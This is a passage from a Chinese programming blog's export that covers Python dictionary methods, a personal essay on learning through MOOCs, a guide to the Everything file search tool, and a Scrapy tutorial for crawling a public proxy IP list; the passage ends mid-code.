<h5 id="get-方法"><a href="#get-方法" class="headerlink" title="get() 方法"></a>get() 方法</h5><p>　　get(key,default=None) 方法是个更宽松的访问字典项的方法，访问字典中不存在的项时不会出错。键存在时，get 方法返回键对应的值，如果该键不存在，则返回 default 指定的值，不指定 default 参数时默认返回 None。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123; &#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> d[<span class="string">'name'</span>]</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">KeyError: <span class="string">'name'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> d.get(<span class="string">'name'</span>)</div><div class="line"><span class="keyword">None</span></div></pre></td></tr></table></figure>
<h5 id="pop-和-popitem-方法"><a href="#pop-和-popitem-方法" class="headerlink" title="pop() 和 popitem() 方法"></a>pop() 和 popitem() 方法</h5><p>　　pop(key，default) 方法用来获得对应于给定键的值，然后将这个键值对从字典中移除。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.pop(<span class="string">'age'</span>)</div><div class="line"><span class="string">'22'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'name'</span>: <span class="string">'fzy'</span>, <span class="string">'class'</span>: <span class="string">'13-3'</span>&#125;</div></pre></td></tr></table></figure>
<p>　　popitem() 类似于 list.pop，但是 list.pop 弹出列表的最后一个元素，popitem 弹出随机的项，因为字典是无序的，并没有“最后的元素”或者其他有关顺序的概念。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.popitem()</div><div class="line">(<span class="string">'age'</span>, <span class="string">'22'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'name'</span>: <span class="string">'fzy'</span>, <span class="string">'class'</span>: <span class="string">'13-3'</span>&#125;</div></pre></td></tr></table></figure>
<h5 id="update-方法"><a href="#update-方法" class="headerlink" title="update() 方法"></a>update() 方法</h5><p>　　update() 方法可以利用一个字典项更新另一个字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="string">'22'</span>,<span class="string">'class'</span>:<span class="string">'13-3'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x = &#123;<span class="string">'age'</span>:<span class="string">'18'</span>,<span class="string">'school'</span>:<span class="string">'hunau'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.update(x)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'age'</span>: <span class="string">'18'</span>, <span class="string">'school'</span>: <span class="string">'hunau'</span>, <span class="string">'name'</span>: <span class="string">'fzy'</span>, <span class="string">'class'</span>: <span class="string">'13-3'</span>&#125;</div></pre></td></tr></table></figure>
<p>提供的字典中的项会被添加到旧的字典中，若有相同的键则会进行覆盖。</p>
<h5 id="setdefault-方法"><a href="#setdefault-方法" class="headerlink" title="setdefault() 方法"></a>setdefault() 方法</h5><p>　　setdefault(key,default=None) 方法能够获得与给定值相关联的值，并且在字典中不含有给定键的情况下设定相应的键值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123; &#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.setdefault(<span class="string">'name'</span>,<span class="string">'fzy'</span>)</div><div class="line"><span class="string">'fzy'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'name'</span>: <span class="string">'fzy'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.setdefault(<span class="string">'name'</span>,<span class="string">'111'</span>)</div><div class="line"><span class="string">'fzy'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'name'</span>: <span class="string">'fzy'</span>&#125;</div></pre></td></tr></table></figure>
<p>　　由上可知，当键不存在的时候，setdefault 返回默认值并且相应地更新字典。如果键存在，那么就返回与其对应的值，但是不改变字典。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>学习慕课这两年</title>
    <url>/2017/01/12/%E5%AD%A6%E4%B9%A0%E6%85%95%E8%AF%BE%E8%BF%99%E4%B8%A4%E5%B9%B4/</url>
    <content><![CDATA[<p>　　算起来，我学习慕课已经有两年多的时间了，从一开始接触的网易公开课，到后来的中国大学MOOC，以及慕课网、极客学院等IT教育类网站，再到近期了解到的学堂在线、Coursera、以及综合MOOC搜索网站：MOOC学院等，这期间，收获很大，感悟也很多。</p>
<a id="more"></a>
<p>　　这是最好的时代也是最坏的时代。</p>
<p>　　越来越多的大学开始投入大量的资金制作慕课，也有越来越多的公司开始搞在线教育的业务，开发了很多在线的课程，我们开始享受到越来越丰富的教育资源，一方面，即使你只是在一所普通的大学，只要你想学，网络已经给我们提供了很多的资源，这在一定程度上，缓解了教育资源分布不均的问题。另一方面，丰富的慕课课程给大家终身学习提供了有利的保障，即使你已经毕业，或者已经步入社会，你同样可以像在学校那样接受教育，来再次提升自己各方面的能力。</p>
<p>　　但是，同样的问题又来了。就像吴军博士在智能时代中说的那样：虽然这是一个非常有希望的时代，这是一个最好的时代，也是一个最坏的时代。因为好坏看你站在哪个角度，你是否参与了，你参与进来，对你来说就是一个最好的时代。如果你拒绝这件事情，可能对你来说未来就是一个很坏的时代。</p>
<p>　　对于慕课时代，如果你充分利用起这些慕课资源在不断地学习，那么你是参与进来了，对于你来说这是个最好的时代，但是如果你拒绝了这件事情，别人在努力提升自己，而你不愿意参与，差距就会慢慢拉开，对你来说就会是一种威胁，这就是一个最坏的时代。虽然，这样看起来总是在竞争，会感觉很累，但是这样社会才会进步。</p>
<p>　　对于我个人来说，这两年累计达上千个小时的学习对我来说有着非常重要的意义，一方面，我通过慕课网站学习了一些国内外一流大学的课程，接受到了更好的教育，使我对一些课程理解更加深刻，另一方面，也是更重要的一点，我们的大学大多是通识教育，不会教太多技术性的东西，但是IT技术类的慕课弥补了这个缺陷，通过这些课程的学习，我掌握了很多软件开发技能，这对于今后的发展也是至关重要的。</p>
<p>　　学习慕课这两年，渐渐明白：教育是一辈子的事情，笑到最后的是一辈子接受教育的人，一定要树立终生学习的观念。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>推荐-效率搜索工具：Everything</title>
    <url>/2017/01/05/%E6%8E%A8%E8%8D%90-%E6%95%88%E7%8E%87%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%EF%BC%9AEverything/</url>
    <content><![CDATA[<p>　　还在为找不到磁盘中的文件而困扰吗？还在为 Windows 自带文件检索工具速度太慢而苦恼吗？不用担心，Everything 帮你来搞定。</p>
<p>　　Everything，一个非常小巧的文件搜索软件，它只有几百 KB，但作为一个快速检索的工具，它麻雀虽小五脏俱全，最重要的是它比系统自带的搜索快很多，非常实用。</p>
<a id="more"></a>
<h4 id="Everything简介"><a href="#Everything简介" class="headerlink" title="Everything简介"></a>Everything简介</h4><p>　　Everything 是一款集性能与速度于一身的搜索工具，它是基于 NTFS 文件系统的特定来实现快速检索的。它也需要建索引，但是索引文件非常小，100多 G 的硬盘大约也就几M到十几M的索引文件，而且建立速度非常快，大约几秒钟就建立完成了。搜索速度呢，快到你不可想象，一般不会超过2秒钟！！更强大的是，它支持正则表达式搜索。</p>
<p>　　它不仅可以检索单个关键词，还能同时空格多个关键词来检索，特殊字符，文件后缀，也没问题，还能按文件名、修改时间等对检索结果排序。绝对是你在日积月累的电脑文件中翻照片、找文档的利器。</p>
<p>　　官网地址：<a href="http://www.voidtools.com/" target="_blank" rel="external">http://www.voidtools.com/</a></p>
<h4 id="下载方式"><a href="#下载方式" class="headerlink" title="下载方式"></a>下载方式</h4><h5 id="官网下载安装（推荐）"><a href="#官网下载安装（推荐）" class="headerlink" title="官网下载安装（推荐）"></a>官网下载安装（推荐）</h5><p>　　一般下载软件最好是到官方网站去下载，这样下载下来的一定是纯净版，这样可以避免很多不必要的麻烦。</p>
<p>　　下载地址：<a href="http://www.voidtools.com/downloads/" target="_blank" rel="external">http://www.voidtools.com/downloads/</a></p>
<p>　　根据电脑系统的位数以及自己的需要下载相应的版本，然后双击下载的 exe 文件进行安装。</p>
<h5 id="360-软件管家下载安装"><a href="#360-软件管家下载安装" class="headerlink" title="360 软件管家下载安装"></a>360 软件管家下载安装</h5><p>　　如果你的电脑安装了 360，那么你可以打开360软件管家搜索 Everything，然后点击安装即可，方便快捷。</p>
<h5 id="百度搜索寻找资源（不推荐）"><a href="#百度搜索寻找资源（不推荐）" class="headerlink" title="百度搜索寻找资源（不推荐）"></a>百度搜索寻找资源（不推荐）</h5><p>　　大家也可以到百度搜索 Everything，马上可以找到这个软件的很多下载资源，但是并不推荐这么做，首先，很多软件下载网站都有很多广告，一不小心点错就下载了另一个软件，另外，还有一些网站提供的软件会有捆绑安装其他软件，所以比较麻烦。</p>
<h4 id="你可能会问"><a href="#你可能会问" class="headerlink" title="你可能会问"></a>你可能会问</h4><h5 id="Everything-为什么这么快？"><a href="#Everything-为什么这么快？" class="headerlink" title="Everything 为什么这么快？"></a>Everything 为什么这么快？</h5><p>　　Everything 是一个运行于 Windows 系统，基于文件、文件夹名称的快速搜索引擎。Everything 在搜索之前就会把所用的文件和文件夹都列出来，这一点与 Windows 自带的搜索系统不一样，所以我们称之为 Everything。在搜索框输入文字，它就会只显示过滤后的文件和目录。</p>
<h5 id="Everything-搜索文件内容吗？"><a href="#Everything-搜索文件内容吗？" class="headerlink" title="Everything 搜索文件内容吗？"></a>Everything 搜索文件内容吗？</h5><p>　　不，Everything 不搜索文件内容，只搜索文件和文件夹名称。</p>
<h5 id="Everything-是不是非常占用系统资源？"><a href="#Everything-是不是非常占用系统资源？" class="headerlink" title="Everything 是不是非常占用系统资源？"></a>Everything 是不是非常占用系统资源？</h5><p>　　不，Everything 使用非常少的系统资源。一个刚安装完的 Windows XP SP2 系统（约20,000份文件）需要占用 3-5 Mb 内存和不到 1 Mb 的硬盘空间。一百万份文件大概需要 45 Mb 内存和 5 Mb 硬盘空间。</p>
<h5 id="如何搜索文件或文件夹？"><a href="#如何搜索文件或文件夹？" class="headerlink" title="如何搜索文件或文件夹？"></a>如何搜索文件或文件夹？</h5><p>　　在搜索编辑中键入部分文件或文件夹名称，结果会立即显示。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/1/5-1.png" alt="5-1"></p>
<h5 id="如何搜索文件类型？"><a href="#如何搜索文件类型？" class="headerlink" title="如何搜索文件类型？"></a>如何搜索文件类型？</h5><p>　　要搜索的文件类型，输入文件扩展名搜索编辑，即搜索 MP3 文件类型，键入 <em> .MP3 到搜索编辑。要搜索多种类型的文件类型，请使用| 到单独的文件类型，如 </em> .BMP | * .JPG 将搜索扩展名为 BMP 或 JPG 文件。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/1/5-2.png" alt="5-2"></p>
<h5 id="如何在特定位置搜索文件和文件夹？"><a href="#如何在特定位置搜索文件和文件夹？" class="headerlink" title="如何在特定位置搜索文件和文件夹？"></a>如何在特定位置搜索文件和文件夹？</h5><p>　　要搜索特定位置中的文件和文件夹，请在搜索字符串中包含\。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/1/5-3.png" alt="5-3"></p>
<h5 id="如何使用布尔运算符？"><a href="#如何使用布尔运算符？" class="headerlink" title="如何使用布尔运算符？"></a>如何使用布尔运算符？</h5><p>　　AND是默认的布尔运算符。例如，下面是如何搜索 ABC 和 123：ABC 123</p>
<p>　　要搜索以下两种搜索词，添加| 之间的术语。例如，下面是如何搜索 .jpg 或 .BMP：.JPG | .BMP</p>
<p>　　要排除的东西从搜索中包括！在术语的前面。例如，下面是如何搜索，除了 ABC 一切：！ABC</p>
<h5 id="如何使用正则表达式？"><a href="#如何使用正则表达式？" class="headerlink" title="如何使用正则表达式？"></a>如何使用正则表达式？</h5><p>　　正则表达式，又称规则表达式，它是计算机科学的一个概念。正则表通常被用来检索、替换那些符合某个模式(规则)的文本。点击 Everything 菜单栏中的帮助，选择正则表达式语法选项即可看到如下界面，使用正在表达式进行搜索。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/1/5-4.png" alt="5-4"></p>
<p>　　<strong>使用示例：</strong></p>
<p>　　搜索 G:\Python学习 路径下的所有 py 格式的文件，这里使用 *.py 来使其匹配所有 py 格式的文件。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/1/5-5.png" alt="5-4"></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Everything</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 爬虫框架：Scrapy</title>
    <url>/2016/12/26/Python%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%EF%BC%9AScrapy/</url>
    <content><![CDATA[<p>　　Scrapy 是一个为了爬取网站数据，提取结构性数据而编写的应用框架。它使用 Twisted 这个异步网络库来处理网络通讯，架构清晰，并且包含了各种中间件接口，可以灵活的完成各种需求。学习 Python 爬虫有一段时间了，但是也是最近才接触到如此强大的 Scrapy，它比 BeautifulSoup 更加完善，BeautifulSoup 可以说是轮子，而 Scrapy 则是车子，不需要你关注太多的细节。</p>
<a id="more"></a>
<h4 id="安装Scrapy"><a href="#安装Scrapy" class="headerlink" title="安装Scrapy"></a>安装Scrapy</h4><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> pip install Scrapy</span></div></pre></td></tr></table></figure>
<p>　　pip 是一个 Python 包管理工具，主要是用于安装 PyPI 上的软件包，可以替代 easy_install 工具。</p>
<h4 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h4><p>　　Windows下，打开命令提示符窗口，进入到打算存储代码的目录中，使用下面的命令创建一个 Scrapy 项目。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">$ scrapy startproject 项目名</div></pre></td></tr></table></figure>
<h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><p>文件管理器打开该目录可以看到多了 Scrapy 项目的文件夹，进入文件夹可以看到如下这些文件：</p>
<ul>
<li><p>scrapy.cfg: 项目的配置文件</p>
</li>
<li><p>项目名/: 该项目的 Python 模块。之后我们将在此加入代码。</p>
</li>
<li><p>项目名/items.py: 项目中的 item 文件.</p>
</li>
<li><p>项目名/pipelines.py: 项目中的 pipelines 文件.</p>
</li>
<li><p>项目名/settings.py: 项目的设置文件.</p>
</li>
<li><p>项目名/spiders/: 放置 spider 代码的目录.</p>
</li>
</ul>
<h4 id="定义要抓取的数据：Item"><a href="#定义要抓取的数据：Item" class="headerlink" title="定义要抓取的数据：Item"></a>定义要抓取的数据：Item</h4><p>　　爬取的主要目标就是从非结构性的数据源提取结构性数据，例如网页。 Scrapy 提供 Item 类来满足这样的需求。Item 是保存爬取到的数据的容器；其使用方法和 Python 字典类似， 并且提供了额外保护机制来避免拼写错误导致的未定义字段错误。Item 对象是种简单的容器，保存了爬取到得数据。 其提供了 类似于词典(dictionary-like) 的 API 以及用于声明可用字段的简单语法。默认生成的 items.py 文件如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="comment"># Define here the models for your scraped items</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># See documentation in:</span></div><div class="line"><span class="comment"># http://doc.scrapy.org/en/latest/topics/items.html</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> scrapy</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">IpspiderItem</span><span class="params">(scrapy.Item)</span>:</span></div><div class="line">    <span class="comment"># define the fields for your item here like:</span></div><div class="line">    <span class="comment"># name = scrapy.Field()</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>　　我们可以 scrapy.Field() 定义一些字段，例如 name、sex 等。</p>
<h4 id="编写提取-Item-数据的-Spider"><a href="#编写提取-Item-数据的-Spider" class="headerlink" title="编写提取 Item 数据的 Spider"></a>编写提取 Item 数据的 Spider</h4><p>　　Spider是用户编写用于从单个网站(或者一些网站)爬取数据的类。其包含了一个用于下载的初始 URL，如何跟进网页中的链接以及如何分析页面中的内容， 提取生成 item 的方法。为了创建一个 Spider，您必须继承 scrapy.Spider 类，且定义以下三个属性:</p>
<ul>
<li>name: 用于区别 Spider。 该名字必须是唯一的，您不可以为不同的 Spider 设定相同的名字。</li>
<li>start_urls: 包含了 Spider 在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的 URL 则从初始的 URL 获取到的数据中提取。</li>
<li>parse() 是 Spider 的一个方法。 被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据（response data），提取数据（生成 item）以及生成需要进一步处理的 URL 的 Request 对象。</li>
</ul>
<p>　　/spiders/<strong>init</strong>.py 的大致框架如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">/spiders/__init__.py的大致框架如下：</div><div class="line"></div><div class="line"><span class="keyword">import</span> scrapy</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DmozSpider</span><span class="params">(scrapy.Spider)</span>:</span></div><div class="line">    name = <span class="string">"这里定义爬虫的名字"</span></div><div class="line">    start_urls = [</div><div class="line">        这里填写起始的网址</div><div class="line">    ]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></div><div class="line">        这里处理请求得到的数据，以及跳转到下一页</div></pre></td></tr></table></figure>
<h4 id="Selectors-选择器"><a href="#Selectors-选择器" class="headerlink" title="Selectors 选择器"></a>Selectors 选择器</h4><p>　　Scrapy 提取数据有自己的一套机制。它们被称作选择器（seletors），因为他们通过特定的 XPath 或者 CSS 表达式来“选择”  HTML 文件中的某个部分。Selector 有四个基本的方法:</p>
<ul>
<li><p>xpath(): 传入 xpath 表达式，返回该表达式所对应的所有节点的 selector list 列表 。</p>
</li>
<li><p>css(): 传入 CSS 表达式，返回该表达式所对应的所有节点的 selector list 列表.</p>
</li>
<li><p>extract(): 序列化该节点为 unicode 字符串并返回 list。</p>
</li>
<li><p>re(): 根据传入的正则表达式对数据进行提取，返回 unicode 字符串 list 列表。</p>
</li>
</ul>
<p>　　XPath 是一门用来在 XML 文件中选择节点的语言，也可以用在 HTML 上。 CSS 是一门将HTML文档样式化的语言。选择器由它定义，并与特定的 HTML 元素的样式相关连。我们可以使用浏览器的开发者工具来得到我们所需节点的 xpath 表达式，然后通过 xpath() 方法来得到其内容，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">response.xpath(<span class="string">'xpath表达式'</span>)</div></pre></td></tr></table></figure>
<p>　　假设，Spider 抓取到的 html 文档如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">'http://example.com/'</span> /&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example website<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'images'</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image1.html'</span>&gt;</span>Name: My image 1 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image1_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image2.html'</span>&gt;</span>Name: My image 2 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image2_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image3.html'</span>&gt;</span>Name: My image 3 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image3_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image4.html'</span>&gt;</span>Name: My image 4 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image4_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image5.html'</span>&gt;</span>Name: My image 5 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image5_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>　　例如，要得到 title 标签内的内容，xpath 表达式应该写成：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">//title/text()</div></pre></td></tr></table></figure>
<p>　　为了提取真实的原文数据，你需要调用 .extract() 方法如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">response.xpath(<span class="string">'//title/text()'</span>).extract()</div><div class="line">结果如下：</div><div class="line">[<span class="string">u'Example website'</span>]</div></pre></td></tr></table></figure>
<p>　　如你所见， .xpath() 方法返回一个类 SelectorList 的实例, 它是一个新选择器的列表。这个 API 可以用来快速的提取嵌套数据。再比如，要得到 a 标签中的链接，应该这样做：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> sel <span class="keyword">in</span> response.xpath(<span class="string">'//div/a'</span>).extract():  <span class="comment">#得到含有所有a标签的列表，遍历列表依次取出其中的链接</span></div><div class="line">    url = sel.xpath(<span class="string">'/@href'</span>)   <span class="comment">#使用@得到属性值</span></div><div class="line">    <span class="keyword">print</span> url</div></pre></td></tr></table></figure>
<p>　　关于 xpath 的语法这里只是举了两个简单的例子，详细的语法可以参考网上其他教程。</p>
<h4 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h4><p>　　我们通过编写一个爬取有代理：12月21号 国内代理 ip 服务器列表的爬虫来练习 Scrapy 的基本使用。地址如下：<a href="http://www.youdaili.net/Daili/guonei/25083.html" target="_blank" rel="external">http://www.youdaili.net/Daili/guonei/25083.html</a></p>
<h5 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">scrapy startproject IpSpider</div></pre></td></tr></table></figure>
<h5 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h5><p>　　打开浏览器的开发者工具，快捷键 f12，笔记本可能需要 fn 键 + f12.</p>
<ol>
<li>定位数据</li>
</ol>
<p>　　点击控制台左上角的图标，然后鼠标箭头移动到代理 ip 列表的一条记录，通过分析我们可以知道所有的记录都是存放在一个 p 标签下的 span 标签里面，所以我们可以先找到所有的 p 标签，然后得到 p 标签下 span 标签的内容即为我们所需要的代理 ip 和地址数据。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-1.png" alt="25-1"></p>
<p>　　那么，如何得到所有的 p 标签呢？</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-2.png" alt="25-2"></p>
<p>　　鼠标选中列表中第一个 ip 地址，右键 copy，然后 copy xpath，得到：<code>/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1]</code></p>
<p>　　第二个 ip 地址的 xpath 为：<code>/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1]</code></p>
<p>　　依此类推，使用 <code>response.xpath(&#39;/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p&#39;)</code> 即可得到所有的 p 标签，即列表的所有项。</p>
<p>　　如何得到 p 标签下 span 标签的内容呢？我们 copy 一下 p 标签下任意一个 span 标签得到 xpath为：<code>/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1]/span</code></p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-3.png" alt="25-3"></p>
<p>　　上一步中我们得到了一个包含所有 p 标签的列表，然后我们遍历这个列表，依次取出每个 p 标签中 span 的内容，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> sel <span class="keyword">in</span> response.xpath(<span class="string">'/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p'</span>):</div><div class="line">    sel.xpath(<span class="string">'span/text()'</span>)</div></pre></td></tr></table></figure>
<p>　　这样我们就可以分别得到每一个列表项，即每一条代理ip地址信息。</p>
<ol>
<li>分析数据格式</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-4.png" alt="25-4"></p>
<p>　　由上图可知，代理 ip 列表的每一项有一条ip信息，我们要获取的 ip 信息位于字符串的 @ 符号之前，地址信息位于 # 符号与空格之间，这是我们处理数据的关键所在。</p>
<ol>
<li>跳转到下一页继续爬取</li>
</ol>
<p>在第一页时：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-5.png" alt="25-5"></p>
<p>　　在第最后一页时：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/12/25-6.png" alt="25-6"></p>
<p>　　每次需要得到下一页按钮的链接，到最后一页时，下一页按钮的链接会变成 # 号，因此我们只要判断得到的链接不是 # 号就代表还有下一页，每次得到下一页的链接我们就把它传入 Request 函数，并 yield 这个 Request 让爬虫继续发送请求，爬取下一个页面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">pagenum = <span class="string">''</span>.join(response.xpath(<span class="string">'/html/body/div[5]/div[1]/div[1]/div[3]/div[4]/li[8]/a/@href'</span>).extract())</div><div class="line">    <span class="keyword">print</span> pagenum</div><div class="line">    <span class="keyword">if</span> pagenum != <span class="string">'#'</span>: </div><div class="line">        nexturl = <span class="string">'http://www.youdaili.net/Daili/guonei/'</span> + pagenum</div><div class="line">        <span class="keyword">print</span> nexturl</div><div class="line">        <span class="keyword">yield</span> Request(nexturl, callback=self.parse)     <span class="comment">#爬取下一页</span></div></pre></td></tr></table></figure>
<h5 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h5><p>　　IpSpider/spiders/<strong>init</strong>.py 的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> scrapy</div><div class="line"><span class="keyword">from</span> IpSpider.items <span class="keyword">import</span> IpspiderItem</div><div class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> Request </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">IpSpider</span><span class="params">(scrapy.Spider)</span>:</span> </div><div class="line">    name = <span class="string">"ip"</span></div><div class="line">    start_urls = [<span class="string">"http://www.youdaili.net/Daili/guonei/25083.html"</span>]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span>       </div><div class="line">        <span class="keyword">for</span> sel <span class="keyword">in</span> response.xpath(<span class="string">'/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p'</span>):</div><div class="line">            item = IpspiderItem()</div><div class="line">            s = <span class="string">''</span>.join(sel.xpath(<span class="string">'span/text()'</span>).extract())</div><div class="line">            item[<span class="string">'ip'</span>] = s[<span class="number">0</span>:s.rfind(<span class="string">'@'</span>,<span class="number">1</span>)]    <span class="comment">#切分字符串，只取ip</span></div><div 